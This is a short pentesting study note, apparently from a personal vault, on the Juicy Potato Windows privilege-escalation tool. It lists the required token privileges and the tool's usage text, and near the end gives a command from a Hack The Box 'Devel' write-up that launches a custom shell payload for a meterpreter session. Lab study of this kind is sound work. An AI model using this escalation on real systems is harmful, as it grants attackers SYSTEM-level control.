# <div align="center">Juicy Potato - Privilege escalation </div>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

[Official github](https://github.com/ohpe/juicy-potato)
### /!\ PayloadAllTheThings /!\ [Cheet Sheat](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#juicy-potato-abusing-the-golden-privileges) with different CLSID to use !
#### x64 bits version [here](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)
#### x86 bits version [here](https://github.com/ivanitlearning/Juicy-Potato-x86/releases/tag/1.2)

#### Usefull documentation [here](https://github.com/decoder-it/whoami-priv/blob/master/whoamipriv.pdf) for more understanding about Windows Privileges

### J-P need one of this enable (or both) :
> `SeImpersonatePrivilege` or `SeAssignPrimaryToken`
> Example : (use `whoami /priv` to see privileges)
![[devel-2nd-privesc-enum.png]]


### Usage : 
```bash
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
-z only test CLSID and print token's user
```

Exemple on DEVEL write-up [here](obsidian://open?vault=Road%20to%20Pentester&file=Hack%20The%20Box%2FDevel)
Using a custom payload (-p flag) and get meterpreter session back after sending this request
```bash
Juicy.Potato.x86.exe -l 1338 -p c:/Users/Public/shell.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```


> Other example :
> ---------------------------------------
![](https://github.com/ohpe/juicy-potato/raw/master/assets/poc.png)